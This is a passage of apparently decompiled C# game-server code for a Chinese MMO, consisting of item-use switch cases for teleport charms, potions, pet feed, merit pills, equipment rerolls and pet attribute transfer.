					土灵符坐标.Add(1, value4);
					移动(-6950f, 16f, 15f, 301);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000112:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array18 = World.地图锁定.Split(';');
					if (array18.Length >= 1)
					{
						int num8 = 0;
						while (num8 < array18.Length)
						{
							if (int.Parse(array18[num8]) == base.人物坐标_地图)
							{
								return;
							}
							int num78 = num8 + 1;
							num8 = num78;
						}
					}
					坐标Class value34 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value34);
					移动(6824f, 437f, 15f, 201);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000113:
				{
					物品使用(num13, num24, 1);
					int num89 = 0;
					int num90 = 0;
					while (num90 < 15)
					{
						if (气功[num90].气功量 != 255)
						{
							num89 += 气功[num90].气功量;
							气功[num90].气功量 = 0;
						}
						int num77 = num90 + 1;
						num90 = num77;
					}
					if (base.Player_Job_leve >= 6)
					{
						foreach (升天气功类 value30 in 升天气功.Values)
						{
							num89 += value30.气功量;
							value30.气功量 = 0;
						}
					}
					base.Player_Qigong_point += num89;
					更新气功();
					更新武功和状态();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 1000000116:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array8 = World.地图锁定.Split(';');
					if (array8.Length >= 1)
					{
						int num86 = 0;
						while (num86 < array8.Length)
						{
							if (int.Parse(array8[num86]) == base.人物坐标_地图)
							{
								return;
							}
							int num76 = num86 + 1;
							num86 = num76;
						}
					}
					坐标Class value18 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value18);
					移动(-1360f, -580f, 15f, 1001);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000117:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array5 = World.地图锁定.Split(';');
					if (array5.Length >= 1)
					{
						int num44 = 0;
						while (num44 < array5.Length)
						{
							if (int.Parse(array5[num44]) == base.人物坐标_地图)
							{
								return;
							}
							int num75 = num44 + 1;
							num44 = num75;
						}
					}
					坐标Class value7 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value7);
					移动(976f, 598f, 15f, 1101);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000122:
					if (base.人物善恶 < 0)
					{
						物品减去属性数量(num24, 1);
						base.人物善恶 += 50000;
						if (base.人物善恶 > 0)
						{
							base.人物善恶 = 0;
						}
						更新武功和状态();
					}
					else
					{
						系统提示("当前善恶值为0，不需要消除。");
					}
					break;
				case 1000000142:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array3 = World.地图锁定.Split(';');
					if (array3.Length >= 1)
					{
						int num35 = 0;
						while (num35 < array3.Length)
						{
							if (int.Parse(array3[num35]) == base.人物坐标_地图)
							{
								return;
							}
							int num74 = num35 + 1;
							num35 = num74;
						}
					}
					坐标Class value6 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value6);
					移动(1214f, 91f, 15f, 2201);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000143:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array21 = World.地图锁定.Split(';');
					if (array21.Length >= 1)
					{
						int num20 = 0;
						while (num20 < array21.Length)
						{
							if (int.Parse(array21[num20]) == base.人物坐标_地图)
							{
								return;
							}
							int num73 = num20 + 1;
							num20 = num73;
						}
					}
					坐标Class value2 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value2);
					移动(-440f, 341f, 15f, 2101);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000161:
					附混石头();
					return;
				case 1000000162:
					附混石头();
					return;
				case 1000000163:
					附混石头();
					return;
				case 1000000164:
					附混石头();
					return;
				case 1008000543:
					一键回收物品();
					return;
				case 1000000951:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 6)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000953:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 7)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000001512:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 7)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 900000231:
					foreach (装备洗髓 value31 in World.装备洗髓系统.Values)
					{
						Random random5 = new Random();
						if (装备栏包裹[0].Get物品ID == value31.装备ID)
						{
							int num68 = random5.Next(value31.属性一最小, value31.属性一最大);
							if (装备栏包裹[0].FLD_MAGIC1 > num68 && value31.模式 != 0)
							{
								num68 = 装备栏包裹[0].FLD_MAGIC1;
							}
							int num69 = random5.Next(value31.属性二最小, value31.属性二最大);
							if (装备栏包裹[0].FLD_MAGIC2 > num69 && value31.模式 != 0)
							{
								num69 = 装备栏包裹[0].FLD_MAGIC2;
							}
							int num70 = random5.Next(value31.属性三最小, value31.属性三最大);
							if (装备栏包裹[0].FLD_MAGIC3 > num70 && value31.模式 != 0)
							{
								num70 = 装备栏包裹[0].FLD_MAGIC3;
							}
							int num85 = random5.Next(value31.属性四最小, value31.属性四最大);
							if (装备栏包裹[0].FLD_MAGIC4 > num85 && value31.模式 != 0)
							{
								num85 = 装备栏包裹[0].FLD_MAGIC4;
							}
							if (num68 >= value31.属性一最大 - 1 && num68 != 0)
							{
								系统提示("恭喜第一条属性已满属性", 3, "系统提示");
							}
							if (num69 >= value31.属性二最大 - 1 && num69 != 0)
							{
								系统提示("恭喜第二条属性已满属性", 3, "系统提示");
							}
							if (num70 >= value31.属性三最大 - 1 && num70 != 0)
							{
								系统提示("恭喜第三条属性已满属性", 3, "系统提示");
							}
							if (num85 >= value31.属性四最大 - 1 && num85 != 0)
							{
								系统提示("恭喜第四条属性已满属性", 3, "系统提示");
							}
							减去物品(0, 1);
							物品使用(num13, num24, 1);
							AddItemWithProperties(value31.装备ID, 0, 1, 0, num68, num69, num70, num85, 0, 0, 0, 0, 0);
							系统提示("恭喜你洗髓成功, 属性已经重置", 10, "系统提示");
							break;
						}
					}
					return;
				case 1000000166:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 1)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 50;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000167:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 1)
					{
						if (GetAddState(1000000167))
						{
							追加状态列表[1000000167].时间结束事件();
						}
						if (GetAddState(1000000168))
						{
							追加状态列表[1000000168].时间结束事件();
						}
						追加状态类 追加状态类29 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类29.FLD_PID, 追加状态类29);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 100;
						人物灵兽.FLD_物品_追加_MP += 90;
						更新灵兽HP_MP_SP();
					}
					return;
				case 900000013:
				{
					if (GetAddState(900000013))
					{
						系统提示("请稍后再试！");
						break;
					}
					追加状态类 追加状态类42 = new 追加状态类(this, 10000, num36, 1);
					追加状态列表.Add(追加状态类42.FLD_PID, 追加状态类42);
					状态效果(array, 1, 10000);
					try
					{
						CheckTreasureGems();
						int num38 = 0;
						foreach (物品回收类 value29 in World.物品回收数据.Values)
						{
							string[] array4 = value29.需要物品.Split(',');
							for (int num40 = 0; num40 < 36; num40++)
							{
								if (int.Parse(array4[0]) == 装备栏包裹[num40].Get物品ID && 装备栏包裹[num40].Get物品数量 >= int.Parse(array4[1]))
								{
									int get物品数量 = 装备栏包裹[num40].Get物品数量;
									减去物品(num40, 装备栏包裹[num40].Get物品数量);
									if (value29.元宝 != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
									{
										num38 += value29.元宝 * get物品数量;
									}
								}
							}
						}
						if (追加状态列表.ContainsKey(999000896))
						{
							num38 += (int)((double)num38 * 0.2);
						}
						if (num38 != 0)
						{
							检察元宝数据(num38, 1, "回收");
							人物发光();
						}
						SaveGemData();
					}
					catch
					{
						MainForm.WriteLine(1, "一键回收卡出错");
					}
					break;
				}
				case 900000234:
					if (装备栏包裹[0].Get物品ID == World.咕咕鸡ID)
					{
						物品使用(num13, num24, 1);
						重置咕咕鸡属性系统();
					}
					else
					{
						系统提示("请将咕咕鸡放在背包第一个格子右键使用", 10, "条件");
					}
					break;
				case 900000238:
					if (装备栏包裹[0].Get物品ID == World.咕咕鸡ID)
					{
						物品使用(num, num13, 1);
						定制咕咕鸡属性系统();
					}
					else
					{
						系统提示("请将咕咕鸡放在背包第一个格子右键使用", 10, "条件");
					}
					break;
				case 1000000168:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 1)
					{
						if (GetAddState(1000000167))
						{
							追加状态列表[1000000167].时间结束事件();
						}
						if (GetAddState(1000000168))
						{
							追加状态列表[1000000168].时间结束事件();
						}
						追加状态类 追加状态类5 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类5.FLD_PID, 追加状态类5);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 150;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 200;
						人物灵兽.FLD_物品_追加_MP += 100;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000169:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 2)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 50;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000170:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 2)
					{
						if (GetAddState(1000000170))
						{
							追加状态列表[1000000170].时间结束事件();
						}
						if (GetAddState(1000000171))
						{
							追加状态列表[1000000171].时间结束事件();
						}
						追加状态类 追加状态类87 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类87.FLD_PID, 追加状态类87);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 100;
						人物灵兽.FLD_物品_追加_MP += 90;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000171:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 2)
					{
						if (GetAddState(1000000170))
						{
							追加状态列表[1000000170].时间结束事件();
						}
						if (GetAddState(1000000171))
						{
							追加状态列表[1000000171].时间结束事件();
						}
						追加状态类 追加状态类32 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类32.FLD_PID, 追加状态类32);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 150;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 200;
						人物灵兽.FLD_物品_追加_MP += 100;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000172:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 3)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 50;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000173:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 3)
					{
						if (GetAddState(1000000173))
						{
							追加状态列表[1000000173].时间结束事件();
						}
						if (GetAddState(1000000174))
						{
							追加状态列表[1000000174].时间结束事件();
						}
						追加状态类 追加状态类6 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类6.FLD_PID, 追加状态类6);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 100;
						人物灵兽.FLD_物品_追加_MP += 90;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000174:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 3)
					{
						if (GetAddState(1000000173))
						{
							追加状态列表[1000000173].时间结束事件();
						}
						if (GetAddState(1000000174))
						{
							追加状态列表[1000000174].时间结束事件();
						}
						追加状态类 追加状态类99 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类99.FLD_PID, 追加状态类99);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 150;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 200;
						人物灵兽.FLD_物品_追加_MP += 100;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000175:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 4)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 50;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000176:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 4)
					{
						if (GetAddState(1000000176))
						{
							追加状态列表[1000000176].时间结束事件();
						}
						if (GetAddState(1000000177))
						{
							追加状态列表[1000000177].时间结束事件();
						}
						追加状态类 追加状态类24 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类24.FLD_PID, 追加状态类24);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 100;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 100;
						人物灵兽.FLD_物品_追加_MP += 90;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000177:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 4)
					{
						if (GetAddState(1000000176))
						{
							追加状态列表[1000000176].时间结束事件();
						}
						if (GetAddState(1000000177))
						{
							追加状态列表[1000000177].时间结束事件();
						}
						追加状态类 追加状态类22 = new 追加状态类(this, 300000, num49, 0);
						追加状态列表.Add(追加状态类22.FLD_PID, 追加状态类22);
						状态效果人物灵兽(array, 1, 300000);
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 150;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						人物灵兽.FLD_物品_追加_HP += 200;
						人物灵兽.FLD_物品_追加_MP += 100;
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000179:
					if (人物灵兽 != null)
					{
						加血灵兽(70);
						物品使用(num13, num24, 1);
						吃药效果灵兽(num49);
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000180:
					if (人物灵兽 != null)
					{
						加血灵兽(160);
						物品使用(num13, num24, 1);
						吃药效果灵兽(num49);
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000181:
					if (人物灵兽 != null)
					{
						加血灵兽(300);
						物品使用(num13, num24, 1);
						吃药效果灵兽(num49);
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000182:
					if (人物灵兽 != null)
					{
						加魔灵兽(70);
						物品使用(num13, num24, 1);
						吃药效果灵兽(num49);
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000183:
					if (人物灵兽 != null)
					{
						加魔灵兽(160);
						物品使用(num13, num24, 1);
						吃药效果灵兽(num49);
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000184:
					if (人物灵兽 != null)
					{
						加魔灵兽(300);
						物品使用(num13, num24, 1);
						吃药效果灵兽(num49);
						更新灵兽HP_MP_SP();
					}
					return;
				case 999000055:
				{
					int num57 = 得到包裹空位(this);
					if (num57 == -1)
					{
						系统提示("请把背包留一个空位, 不然传承无法输出！", 10, "系统提示");
						return;
					}
					if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0)
					{
						系统提示("请把需要转移的宠物放到背包第一格", 10, "系统提示");
						return;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), out var value13))
					{
						系统提示("请把带属性的宠物放到背包第一格", 10, "系统2提示");
						return;
					}
					if (value13.FLD_RESIDE2 != 15)
					{
						系统提示("请把带属性的宠物放到背包第一格", 10, "系统2提示");
						return;
					}
					if (BitConverter.ToInt64(装备栏包裹[1].物品全局ID, 0) == 0)
					{
						系统提示("请把接受无属性的宠物放到背包第二格", 10, "系统提示");
						return;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[1].物品ID, 0), out var value14))
					{
						系统提示("请把接受受无属性的宠物放到背包第二格", 10, "系统提示");
						return;
					}
					if (value14.FLD_RESIDE2 != 15)
					{
						系统提示("宠物传承第二格只能放宠物", 10, "系统提示");
						return;
					}
					if (装备栏包裹[1].FLD_MAGIC0 != 0 || 装备栏包裹[1].FLD_MAGIC1 != 0)
					{
						系统提示("第二格必须是白宠物", 10, "系统提示");
						return;
					}
					if (value13.FLD_RESIDE2 != value14.FLD_RESIDE2)
					{
						系统提示("宠物传承必须都是宠物才可以传承", 10, "系统提示");
						return;
					}
					AddItemWithProperties(BitConverter.ToInt32(装备栏包裹[1].物品ID, 0), num57, 1, 装备栏包裹[0].FLD_MAGIC0, 装备栏包裹[0].FLD_MAGIC1, 装备栏包裹[0].FLD_MAGIC2, 装备栏包裹[0].FLD_MAGIC3, 装备栏包裹[0].FLD_MAGIC4, 0, 0, 0, 0, 0);
					减去物品(0, 1);
					减去物品(1, 1);
					物品使用(num13, num24, 1);
					string text3 = value13.ItmeNAME.ToString();
					string text4 = value14.ItmeNAME.ToString();
					系统提示("恭喜玩家★" + base.UserName + "★使用[宠物传承卷]成功把宠物【" + text3 + "】属性转移到【" + text4 + "】身上...！", 10, "宠物传承");
					break;
				}
				case 1000000185:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000833))
					{
						加血(1200);
					}
					else if (追加状态列表.ContainsKey(1000000834))
					{
						加血(900);
					}
					else if (异常状态.ContainsKey(20))
					{
						加血(480);
					}
					else
					{
						加血(600);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000186:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000834))
					{
						加魔(900);
					}
					else if (异常状态.ContainsKey(20))
					{
						加魔(480);
					}
					else
					{
						加魔(600);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000199:
					附混石头();
					return;
				case 1000000282:
					if (base.Player_WuXun < 0)
					{
						系统提示("你的武勋为负，不能使用");
						return;
					}
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(500000)。");
					base.Player_WuXun += 50000;
					更新武功和状态();
					return;
				case 1000000285:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array20 = World.地图锁定.Split(';');
					if (array20.Length >= 1)
					{
						int num19 = 0;
						while (num19 < array20.Length)
						{
							if (int.Parse(array20[num19]) == base.人物坐标_地图)
							{
								return;
							}
							int num81 = num19 + 1;
							num19 = num81;
						}
					}
					坐标Class value39 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value39);
					移动(-900f, 145f, 15f, 6001);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000286:
					if (base.Player_WuXun < 0)
					{
						系统提示("你的武勋为负，不能使用");
						return;
					}
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(10000)。");
					base.Player_WuXun += 10000;
					更新武功和状态();
					return;
				case 1000000287:
					if (base.Player_WuXun < 0)
					{
						系统提示("你的武勋为负，不能使用");
						return;
					}
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(20000)。");
					base.Player_WuXun += 20000;
					更新武功和状态();
					return;
				case 1000000288:
					if (base.Player_WuXun < 0)
					{
						系统提示("你的武勋为负，不能使用");
						return;
					}
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(30000)。");
					base.Player_WuXun += 30000;
					更新武功和状态();
					return;
				case 1000000289:
					if (base.Player_WuXun < 0)
					{
						系统提示("你的武勋为负，不能使用");
						return;
					}
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(40000)。");
					base.Player_WuXun += 40000;
					更新武功和状态();
					return;
				case 1000000290:
				{
					Random random = new Random();
					int num16 = random.Next(1000, 10000);
					if (base.Player_WuXun < 0)
					{
						系统提示("你的武勋为负，不能使用");
						return;
					}
					物品使用(num13, num24, 1);
					系统提示("随机武勋丹(" + num16 + ")。");
					base.Player_WuXun += num16;
					更新武功和状态();
					return;
				}
				case 1000000291:
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(70000)。");
					base.Player_WuXun += 70000;
					更新武功和状态();
					return;
				case 1000000293:
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(80000)。");
					base.Player_WuXun += 80000;
					更新武功和状态();
					return;
				case 1000000294:
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(90000)。");
					base.Player_WuXun += 900000;
					更新武功和状态();
					return;
				case 1000000299:
					物品使用(num13, num24, 1);
					系统提示("使用武勋丹(5500000)。");
					base.Player_WuXun += 5500000;
					更新武功和状态();
					return;
				case 1000000295:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000833))
					{
						加血(2000);
					}
					else if (追加状态列表.ContainsKey(1000000834))
					{
						加血(1500);
					}
					else if (异常状态.ContainsKey(20))
					{
						加血(800);
					}
					else
					{
						加血(1000);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000296:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000834))
					{
						加魔(1500);
					}
					else if (异常状态.ContainsKey(20))
					{
						加魔(800);
					}
					else
					{
						加魔(1000);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000297:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000833))
					{
						加血(3400);
					}
					else if (追加状态列表.ContainsKey(1000000834))
					{
						加血(2550);
					}
					else if (异常状态.ContainsKey(20))
					{
						加血(1360);
					}
					else
					{
						加血(1700);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000298:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000834))
					{
						加魔(2550);
					}
					else if (异常状态.ContainsKey(20))
					{
						加魔(1360);
					}
					else
					{
						加魔(1700);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000408:
				{
					if (追加状态列表.ContainsKey(1000000408))
					{
						追加状态列表[1000000408].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1000000408), 1, 90000);
					追加状态类 追加状态类84 = new 追加状态类(this, 90000, 1000000408, 0);
					追加状态列表.Add(追加状态类84.FLD_PID, 追加状态类84);
					addFLD_追加百分比_攻击(0.1);
					更新武功和状态();
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000415:
				case 1000000416:
				{
					if ((int)DateTime.Now.Subtract(情侣移动time).TotalMilliseconds < 10000)
					{
						return;
					}
					if (解除关系倒计时 != 0)
					{
						情侣提示(53, base.UserName, base.FLD_情侣);
						return;
					}
					情侣移动time = DateTime.Now;
					if (base.FLD_情侣.Length == 0)
					{
						return;
					}
					string[] array19 = World.监狱地图.Trim().Split(',');
					if (base.人物坐标_地图 == int.Parse(array19[0]) && base.人物善恶 < 0)
					{
						系统提示("你想逃狱么~这里苍蝇都飞不出去, 安心的泡点吧", 10, "系统提示");
						return;
					}
					Players players9 = World.检查玩家name(base.FLD_情侣);
					if (players9 != null)
					{
						if (players9.人物坐标_地图 == 20001 || players9.人物坐标_地图 == 9001 || players9.人物坐标_地图 == 9101 || players9.人物坐标_地图 == 9201 || players9.人物坐标_地图 == 42001 || ((players9.人物坐标_地图 == 42101) ? true : false))
						{
							系统提示("此处不允许使用。");
							return;
						}
						if (players9.人物坐标_地图 == 32002)
						{
							if (活动地图剩余时间 <= 0)
							{
								系统提示("移动失败, 活动地图剩余时间为零。");
								return;
							}
							FBtime = DateTime.Now;
							系统提示("开始计时, [" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
						}
						else if (players9.人物坐标_地图 == 30000 || players9.人物坐标_地图 == 30100 || players9.人物坐标_地图 == 30200 || ((players9.人物坐标_地图 == 30300) ? true : false))
						{
							if (修炼地图剩余时间 <= 0)
							{
								系统提示("移动失败, 修炼地图剩余时间为零。");
								return;
							}
							FBtime = DateTime.Now;
							系统提示("开始计时, [" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
						}
						移动(players9.人物坐标_X, players9.人物坐标_Y, players9.人物坐标_Z, players9.人物坐标_地图);
						人物发光();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					else
					{
						系统提示("对方不在线, 请稍后在尝试。");
					}
					return;
				}
				case 1000000617:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array17 = World.地图锁定.Split(';');
					if (array17.Length >= 1)
					{
						int num96 = 0;
						while (num96 < array17.Length)
						{
							if (int.Parse(array17[num96]) == base.人物坐标_地图)
							{
								return;
							}
							int num83 = num96 + 1;
							num96 = num83;
						}
					}
					坐标Class value12 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value12);
					移动(1900f, -820f, 15f, 5001);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000643:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array14 = World.地图锁定.Split(';');
					if (array14.Length >= 1)
					{
						int num97 = 0;
						while (num97 < array14.Length)
						{
							if (int.Parse(array14[num97]) == base.人物坐标_地图)
							{
								return;
							}
							int num82 = num97 + 1;
							num97 = num82;
						}
					}
					坐标Class value26 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value26);
					移动(-1900f, 2000f, 15f, 25100);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000678:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					if (base.Player_Level < 130)
					{
						系统提示("等级达到130级才能进入此地图。");
						return;
					}
					string[] array9 = World.地图锁定.Split(';');
					if (array9.Length >= 1)
					{
						int num93 = 0;
